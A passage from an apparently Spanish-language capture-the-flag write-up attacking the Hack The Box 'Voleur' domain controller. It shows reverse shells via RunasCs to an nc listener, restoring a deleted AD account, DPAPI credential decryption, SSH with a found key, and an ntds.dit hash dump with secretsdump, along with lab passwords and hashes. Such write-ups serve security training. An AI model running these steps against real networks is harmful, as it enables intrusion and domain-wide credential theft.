Entonces desde svc_winrm solo podemos impersonar al usuario svc_ldap para restaurar el objeto de todd y enumerar nuevamente desde ahi ya que pertenece a REMOTE MANAGMENT USERS.

Utilizamos runas.exe para efectuar la impersonalizacion de svc_ldap sus las credenciales : ** M1XyC9pW7qT5Vn **, restaurar a todd.wolfe y acceder a credenciales de otros usuarios.

[Windows Privilege Escalation](https://krovs.github.io/oscp-notes/15_windows_privesc/#runascs)

[RunasCo Repo](https://github.com/antonioCoco/RunasCs)

1. Impersonar svc_ldap con RunasCo

2. Restaurar todd object desde svc_winrm (evilwinrm)

3. Enumerar bloodhound-python

1. Subimos RunasCs.exe a la sesion de svc_winrm y ejecutamos con un receptor nc activo

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.16.34:4444
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.                                                                                    
                                                                                                                    
[+] Running in session 0 with process function CreateProcessWithLogonW()                                            
[+] Using Station\Desktop: Service-0x0-1bc79c5$\Default                                                             
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 1916 created in background.
```

2. Receptor:

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.34] from (UNKNOWN) [10.10.11.76] 64051
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
voleur\svc_ldap

C:\Windows\system32>
```

* Obtenemos los objetos borrados:

```bash
PS C:\Windows\system32> Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties * | Where-Object {$_.ObjectClass -eq "user"} | Format-List *                                                                          
Get-ADObject -Filter 'IsDeleted -eq $true' -IncludeDeletedObjects -Properties * | Where-Object {$_.ObjectClass -eq "user"} | Format-List *                                                                                                  
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
accountExpires                  : 9223372036854775807                                                                                                                                                                                       
badPasswordTime                 : 0                                                                                                                                                                                                         
badPwdCount                     : 0                                                                                                                                                                                                         
CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe                                                                                                                                                                     
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db                                                                                                                                                                  
CN                              : Todd Wolfe                                                                                                                                                                                                
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db                                                                                                                                                                  
codePage                        : 0                                                                                                                                                                                                         
countryCode                     : 0                                                                                                                                                                                                         
Created                         : 1/29/2025 1:08:06 AM                                                                                                                                                                                      
createTimeStamp                 : 1/29/2025 1:08:06 AM                                                                                                                                                                                      
Deleted                         : True                                                                                                                                                                                                      
Description                     : Second-Line Support Technician                                                                                                                                                                            
DisplayName                     : Todd Wolfe                                                                                                                                                                                                
DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted                                                                                                                                       
                                  Objects,DC=voleur,DC=htb                                                                                                                                                                                  
dSCorePropagationData           : {9/20/2025 3:22:27 PM, 9/20/2025 1:49:47 PM, 9/19/2025 10:19:54 PM, 9/19/2025                                                                                                                             
                                  5:07:44 PM...}
givenName                       : Todd
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
lastLogoff                      : 0
lastLogon                       : 134028195832746885
lastLogonTimestamp              : 134028007125271494
logonCount                      : 5
memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management 
                                  Users,CN=Builtin,DC=voleur,DC=htb}
Modified                        : 9/20/2025 3:32:30 PM
modifyTimeStamp                 : 9/20/2025 3:32:30 PM
msDS-LastKnownRDN               : Todd Wolfe
Name                            : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : 
ObjectClass                     : user
ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133826280731790960
sAMAccountName                  : todd.wolfe
sDRightsEffective               : 0
sn                              : Wolfe
userAccountControl              : 66048
userPrincipalName               : todd.wolfe@voleur.htb
uSNChanged                      : 139594
uSNCreated                      : 12863
whenChanged                     : 9/20/2025 3:32:30 PM
whenCreated                     : 1/29/2025 1:08:06 AM
PropertyNames                   : {accountExpires, badPasswordTime, badPwdCount, CanonicalName...}
AddedProperties                 : {}
RemovedProperties               : {}
ModifiedProperties              : {}
PropertyCount                   : 44

PS C:\Windows\system32>
```

* Restauramos:

```bash
PS C:\Windows\system32> Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
Restore-ADObject -Identity "1c6b1deb-c372-4cbb-87b1-15031de169db"
```

* Corroboramos la restauracion:

```bash
PS C:\Windows\system32> net user /domain                                                                                                                                                                                                    
net user /domain                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
User accounts for \\DC                                                                                                                                                                                                                      
                                                                                                                                                                                                                                            
-------------------------------------------------------------------------------                                                                                                                                                             
Administrator            krbtgt                   svc_ldap                                                                                                                                                                                  
todd.wolfe                                                                                                                                                                                                                                  
The command completed successfully.
```

> Tenemos credenciales de todd, por lo tanto podemos pedir ticket granting ticket (TGT)

1. Pedimos el TGT:

```bash
impacket-getTGT voleur.htb/todd.wolfe:'NightT1meP1dg3on14'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in todd.wolfe.ccache

```
2. Exportamos 

```bash
export KRB5CCNAME=todd.wolfe.ccache 
```
3. Corroboramos el ticket:

```bash
klist
Ticket cache: FILE:todd.wolfe.ccache
Default principal: todd.wolfe@VOLEUR.HTB

Valid starting       Expires              Service principal
09/20/2025 20:32:13  09/21/2025 06:32:13  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 09/21/2025 20:32:12
```

4. Podemos entrar por SMB

```bash
impacket-smbclient dc.voleur.htb -k                                            
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# 
```

* O podemos impersonar a todd con runas:

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 cmd.exe -r 10.10.16.34:4445
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.                                                                                                      
                                                                                                                              
[+] Running in session 0 with process function CreateProcessWithLogonW()                                                      
[+] Using Station\Desktop: Service-0x0-1bc79c5$\Default                                                                       
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 940 created in background.
```

* Receptor

```bash
nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.16.34] from (UNKNOWN) [10.10.11.76] 64200
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
voleur\todd.wolfe

C:\Windows\system32>
```

* Teniendo habilitado el usuario todd volvemos a ejecutar bloodhound sobre el DC:

```bash
bloodhound-python -u 'ryan.naylor' -p 'HollowOct31Nyt' -dc dc.voleur.htb -d voleur.htb -ns 10.10.11.76 -c all --zip
```



* Encontramos keys y credenciales DPAPI en **svc_winrm**

- Blob:

```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> dir -h C:\Users\svc_winrm\AppData\Local\Microsoft\Credentials
                                                                                                                              
                                                                                                                              
    Directory: C:\Users\svc_winrm\AppData\Local\Microsoft\Credentials                                                         
                                                                                                                              
Mode                 LastWriteTime         Length Name                                                                        
----                 -------------         ------ ----                                                                        
-a-hs-         1/29/2025   7:07 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

- Keys:

```bash
C:\Users\svc_winrm\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1601\2df1d8a3-cb47-4723-9d2e-b826b57a
```
> Estas credenciales son practicamente inaccesibles debido a lo complejo que resulta descargarlas si no es por medio de un cliente smb, por lo tanto solo nos enfocamos en las credenciales de todd
---

Al entrar por el cliente smb con el TGT de todd activo, extraemos credenciales DPAPI del usuario todd.

```bash
impacket-smbclient dc.voleur.htb -k                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 17:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:03 2025 Second-Line Support
# cd Second-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:03 2025 .
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 Archived Users
# cd Archived Users
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:03 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:16 2025 todd.wolfe
# cd todd.wolfe
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:16 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:06 2025 3D Objects
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 AppData
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Contacts
drw-rw-rw-          0  Thu Jan 30 11:28:50 2025 Desktop
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Documents
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Downloads
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Favorites
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Links
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Music
-rw-rw-rw-      65536  Wed Jan 29 12:13:06 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Wed Jan 29 09:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Wed Jan 29 09:53:07 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Wed Jan 29 09:53:07 2025 ntuser.ini
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Pictures
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Saved Games
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Searches
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Videos
# cd AppData
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:16 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Local
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 LocalLow
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Roaming
# cd Roaming
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Adobe
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Microsoft
# cd Microsoft
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Credentials
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Crypto
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Internet Explorer
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Network
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Protect
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Spelling
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 SystemCertificates
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Vault
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Windows
# cd Credentials
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
-rw-rw-rw-        398  Wed Jan 29 10:13:50 2025 772275FAD58525253490A9B0039791D3
# get 772275FAD58525253490A9B0039791D3
# pwd                                                                                                                                 
/Second-Line Support/Archived Users/todd.wolfe/AppData                                                                                
# ls                                                                                                                                  
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .                                                                                     
drw-rw-rw-          0  Wed Jan 29 12:13:16 2025 ..                                                                                    
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Local                                                                                 
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 LocalLow                                                                              
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Roaming                                                                               
# cd Roaming                                                                                                                          
# ls                                                                                                                                  
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .                                                                                     
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..                                                                                    
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Adobe                                                                                 
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Microsoft                                                               
# cd Microsoft                                                                                                          
# ls                                                                                                                    
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .                                                                       
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..                                                                      
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Credentials                                                             
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Crypto                                                                  
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Internet Explorer                                                       
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Network                                                                 
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Protect                                                                 
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Spelling                                                                
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 SystemCertificates                                                      
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 Vault                                                                   
drw-rw-rw-          0  Wed Jan 29 12:13:10 2025 Windows                                                                 
# cd Protect
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
-rw-rw-rw-         24  Wed Jan 29 09:53:08 2025 CREDHIST
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 S-1-5-21-3927696377-1337352550-2781715495-1110
-rw-rw-rw-         76  Wed Jan 29 09:53:08 2025 SYNCHIST
# cd S-1-5-21-3927696377-1337352550-2781715495-1110
# ls
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 .
drw-rw-rw-          0  Wed Jan 29 12:13:09 2025 ..
-rw-rw-rw-        740  Wed Jan 29 10:09:25 2025 08949382-134f-4c63-b93c-ce52efc0aa88
-rw-rw-rw-        900  Wed Jan 29 09:53:08 2025 BK-VOLEUR
-rw-rw-rw-         24  Wed Jan 29 09:53:08 2025 Preferred
# cd 08949382-134f-4c63-b93c-ce52efc0aa88
[-] SMB SessionError: code: 0xc0000103 - STATUS_NOT_A_DIRECTORY - A requested opened file is not a directory.
# get 08949382-134f-4c63-b93c-ce52efc0aa88
# 
```

* Crackeamos las credenciales con el modulo de impacket-dpapi:

1. Obtenemos el SID de todd:

```bash
PS C:\Windows\system32> ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value              
([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value                                                                                                                                                                      
S-1-5-21-3927696377-1337352550-2781715495-1110
```

2. Crackeamos el master key

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83

```

3. Crackeamos el blob con el key:

```bash
impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m
```

Obtenemos credenciales de jeremy.combs y repetimos el proceso


1. Pedimos un TGT
```bash
impacket-getTGT voleur.htb/jeremy.combs:'qT3V9pLXyN7W4m'                                                                                                                                       
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in jeremy.combs.ccache
```
2. Exportamos

```bash
export KRB5CCNAME=jeremy.combs.ccache
```

3. Nos conectamos por smb y looteamos

```bash
impacket-smbclient dc.voleur.htb -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT                                                                                                                                                                                                                                          
NETLOGON                                                                                                                                                                                                                                    
SYSVOL                                                                                                                                                                                                                                      
# use IT
# ls                                                                                                                                                                                                                                        
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 .                                                                                                                                                                                           
drw-rw-rw-          0  Thu Jul 24 17:09:59 2025 ..                                                                                                                                                                                          
drw-rw-rw-          0  Thu Jan 30 13:11:29 2025 Third-Line Support                                                                                                                                                                          
# cd Third-Line Support                                                                                                                                                                                                                     
# ls                                                                                                                                                                                                                                        
drw-rw-rw-          0  Thu Jan 30 13:11:29 2025 .                                                                                                                                                                                           
drw-rw-rw-          0  Wed Jan 29 06:10:01 2025 ..                                                                                                                                                                                          
-rw-rw-rw-       2602  Thu Jan 30 13:11:29 2025 id_rsa                                                                                                                                                                                      
-rw-rw-rw-        186  Thu Jan 30 13:07:35 2025 Note.txt.txt                                                                                                                                                                                
# cat Note.txt.txt                                                                                                                                                                                                                          
Jeremy,                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.                                                                                                                    
                                                                                                                                                                                                                                            
Please see what you can set up.                                                                                                                                                                                                             
                                                                                                                                                                                                                                            
Thanks,                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Admin
# get id_rsa
```

Tenemos una nota mencionando las un posible backup. Ademas tenemos un id_rsa que no permite conectarnos por ssh en el puerto 2222 (ver resultado nmap).
Revisando los nuevos resultados de bloodhound vemos un usuario **svc_backup**

1. Le damos al id_rsa los permisos necesarios:

```bash
chmod 600 id_rsa
```

2. Al intentar loguearno con jeremy no tenemos resultados e intentamos con svc_backup:

```bash
ssh -i id_rsa svc_backup@10.10.11.76 -p 2222
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep 20 19:07:14 PDT 2025

  System load:    0.52      Processes:             12
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   33%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     5%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable

                                                                                                                                                                                                                                            
The list of available updates is more than a week old.                                                                                                                                                                                      
To check for new updates run: sudo apt update                                                                                                                                                                                               
                                                                                                                                                                                                                                            
Last login: Fri Sep 19 22:52:50 2025 from 127.0.0.1                                                                                                                                                                                         
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                                         [ OK ] 
svc_backup@DC:~$
```

* Buscamos posibles backups y encontramos un directorio de interes:

```bash
svc_backup@DC:~$ find / -type f -name '*.bak' 2>/dev/null 
/mnt/c/Users/svc_backup/AppData/Local/Microsoft/Internet Explorer/brndlog.bak
svc_backup@DC:~$ find / -type f -name '*.old' 2>/dev/null 
/mnt/c/Users/svc_backup/AppData/Local/Microsoft/Edge/User Data/Default/EdgePushStorageWithConnectTokenAndKey/LOG.old
/mnt/c/Windows/security/logs/scecomp.old
/usr/share/byobu/desktop/byobu.desktop.old
/usr/share/info/dir.old
svc_backup@DC:~$ find / -type f -name '*.dit' 2>/dev/null 
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit
/mnt/c/Windows/servicing/LCU/Package_for_RollupFix~31bf3856ad364e35~amd64~~20348.3807.1.7/amd64_microsoft-windows-d..services-adam-setup_31bf3856ad364e35_10.0.20348.3692_none_e4825516b06ab077/f/adamntds.dit
/mnt/c/Windows/System32/ntds.dit
/mnt/c/Windows/WinSxS/amd64_microsoft-windows-d..rvices-domain-files_31bf3856ad364e35_10.0.20348.1_none_247a0bbe0c66a485/ntds.dit
/mnt/c/Windows/WinSxS/amd64_microsoft-windows-d..services-adam-setup_31bf3856ad364e35_10.0.20348.3692_none_e4825516b06ab077/adamntds.dit
svc_backup@DC:~$ find / -type f -name '*.jfm' 2>/dev/null 
/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.jfm
/mnt/c/Users/svc_backup/AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.jfm
/mnt/c/Users/svc_backup/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/CacheStorage/CacheStorage.jfm
/mnt/c/Users/svc_backup/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/AppData/Indexed DB/IndexedDB.jfm
/mnt/c/Windows/security/database/secedit.jfm
/mnt/c/Windows/SoftwareDistribution/DataStore/DataStore.jfm
/mnt/c/Windows/System32/catroot2/{127D0A1D-4EF2-11D1-8608-00C04FC295EE}/catdb.jfm
/mnt/c/Windows/System32/catroot2/{F750E6C3-38EE-11D1-85E5-00C04FC295EE}/catdb.jfm
/mnt/c/Windows/System32/config/systemprofile/AppData/Local/DataSharing/Storage/DSTokenDB2.jfm
```

[NTDS Secrets](https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds)

Inspeccionamos las carpetas

```bash
svc_backup@DC:~$ cd "/mnt/c/IT/Third-Line Support/Backups"
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls -la
total 0
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  .
dr-xr-xr-x 1 svc_backup svc_backup 4096 Jan 30  2025  ..
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025 'Active Directory'
drwxrwxrwx 1 svc_backup svc_backup 4096 Jan 30  2025  registry

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls -la 'Active Directory'                                                                                                                                                               
total 24592                                                                                                                                                                                                                                 
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 .                                                                                                                                                                                  
drwxrwxrwx 1 svc_backup svc_backup     4096 Jan 30  2025 ..                                                                                                                                                                                 
-rwxrwxrwx 1 svc_backup svc_backup 25165824 Jan 30  2025 ntds.dit                                                                                                                                                                           
-rwxrwxrwx 1 svc_backup svc_backup    16384 Jan 30  2025 ntds.jfm

svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls registry
SECURITY  SYSTEM
```

Podemos dumpear secrets con esta convinacion de archvios:

1. Descargamos:

```bash
scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .

The authenticity of host '[dc.voleur.htb]:2222 ([10.10.11.76]:2222)' can't be established.
ED25519 key fingerprint is SHA256:mKWAEwLTnEN2bJNi7fkc+BZodiXCIiP3ywSLJiZL0ss.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:114: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[dc.voleur.htb]:2222' (ED25519) to the list of known hosts.
ntds.dit                                                                                                                                                                                                  100%   24MB   1.2MB/s   00:19    
ntds.jfm

scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
SECURITY                                                                                                                                                                                                  100%   32KB  14.9KB/s   00:02    
SYSTEM
```

2. Dumpeamos

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL                                         
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
